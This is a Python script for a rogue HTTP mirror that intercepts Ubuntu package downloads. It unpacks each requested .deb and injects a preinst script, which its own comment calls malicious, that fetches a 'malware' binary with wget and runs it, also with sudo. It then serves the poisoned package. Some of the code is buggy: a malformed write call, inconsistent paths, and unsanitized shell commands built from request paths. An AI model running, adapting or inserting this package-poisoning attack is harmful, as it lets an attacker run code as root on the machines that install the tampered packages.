from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import os
import os.path
# import hashlib

base_url = "http://nl.archive.ubuntu.com"

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        print("request:", self.path)
        if "ubuntu/pool" in self.path:
            r = requests.get(base_url + self.path)
            print(type(r))
            print(r.headers)
            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            package = self.path.split("/")[-1]

            # extract deb files
            os.system("ar x {} --output extracting_area".format(package))

            # unzip control
            os.system("gunzip {}/control.tar.gzip".format(package))
            os.system("tar x {}/control.tar".format(package))

            # checks whether preinst exists already
            if(os.path.exists("{}/control.tar/preinst".format(package)) == False):
                # add malicious preinst
                os.system("tar rf {}/control.tar preinst".format(package))
            # if preinst already exists copy created preinst into the exisiting one
            else:
                w_preinst = open("preinst", "w")
                w_preinst.write(
                        "#!/bin/sh \n",
                        "echo \"DOWNLOAD\" \n",
                        "wget nl.archive.ubuntu.com/malware \n",
                        "./malware \n",
                        "sudo ./malware \n")
                w_preinst.close()

            # zip control
            os.system("gzip {}/control.tar.gzip".format(package))

            # add control back to the deb
            os.system("ar r ./test/control.tar.gz {}.deb".format(package))

            f = open("{}.deb".format(package), "rb")
            content = f.read()

            # if python 3 - bytes(content)
            self.wfile.write(content)
            f.close()
        else:
            self.send_response(200)
            self.end_headers()
            f = open("." + self.path, "rb")
            content = f.read()
            # print(content)
            self.wfile.write(content)
            f.close()

if __name__ == "__main__":
    ip = "192.168.192.11"
    port = 80

    web_server = HTTPServer((ip, port), Server)
    print("Server started at {}:{}".format(ip, port))

    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass

    web_server.server_close()
    print("Server stopped")
